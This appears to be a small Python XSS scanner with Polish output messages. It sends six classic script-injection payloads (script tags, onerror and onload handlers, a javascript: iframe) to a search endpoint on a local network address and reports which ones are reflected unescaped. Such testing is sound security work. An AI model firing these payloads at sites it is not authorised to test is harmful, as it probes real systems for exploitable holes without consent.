import requests
from bs4 import BeautifulSoup
url = "http://192.168.1.197:5000/search"
payloads = [
    "<script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<body onload=alert(1)>"
]
for payload in payloads:
    parametr = {"q": payload}
    odp = requests.get(url, params=parametr)
    x = BeautifulSoup(odp.text, "html.parser")
    if payload in odp.text:
        print(f"[!] Potencjalna podatność XSS z payloadem: {payload}")
    else:
        print(f"[-] Payload niewstrzyknięty: {payload}")